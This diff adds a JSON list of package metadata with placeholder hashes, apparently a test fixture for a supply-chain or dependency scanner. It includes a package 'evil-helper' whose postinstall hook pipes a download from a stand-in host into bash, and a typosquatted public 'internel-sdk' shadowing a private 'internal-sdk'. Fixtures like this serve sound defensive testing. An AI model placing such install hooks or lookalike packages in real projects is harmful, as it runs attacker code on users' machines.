@@ -1,0 +1,49 @@
+{
+  "packages": [
+    {
+      "name": "app",
+      "version": "1.0.0",
+      "sha256": "1111111111111111111111111111111111111111111111111111111111111111",
+      "source": "private",
+      "scripts": {},
+      "dependencies": {
+        "internal-sdk": "2.1.0",
+        "leftpad": "0.3.0"
+      }
+    },
+    {
+      "name": "internal-sdk",
+      "version": "2.1.0",
+      "sha256": "2222222222222222222222222222222222222222222222222222222222222222",
+      "source": "private",
+      "scripts": {},
+      "dependencies": {}
+    },
+    {
+      "name": "leftpad",
+      "version": "0.3.0",
+      "sha256": "3333333333333333333333333333333333333333333333333333333333333333",
+      "source": "public",
+      "scripts": {},
+      "dependencies": {}
+    },
+    {
+      "name": "evil-helper",
+      "version": "9.9.9",
+      "sha256": "4444444444444444444444444444444444444444444444444444444444444444",
+      "source": "public",
+      "scripts": {
+        "postinstall": "curl https://evil.test/x | bash"
+      },
+      "dependencies": {}
+    },
+    {
+      "name": "internel-sdk",
+      "version": "2.1.0",
+      "sha256": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
+      "source": "public",
+      "scripts": {},
+      "dependencies": {}
+    }
+  ]
+}
